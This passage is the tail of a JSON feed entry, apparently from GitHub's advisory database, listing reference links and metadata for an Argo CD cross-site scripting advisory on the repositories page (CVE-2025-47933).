#argo-cd</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1\">https://github.com/argoproj/argo-cd/commit/a5b4041a79c54bc7b3d090805d070bcdb9a9e4d1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47933\">https://nvd.nist.gov/vuln/detail/CVE-2025-47933</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2hj5-g64g-fp6p\">https://github.com/advisories/GHSA-2hj5-g64g-fp6p</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p",
            "title": "[github.com/argoproj/argo-cd] Argo CD allows cross-site scripting on repositories page",
            "date_modified": "2025-05-29T21:59:50.000Z",
            "date_published": "2025-05-28T17:36:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2hj5-g64g-fp6p"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}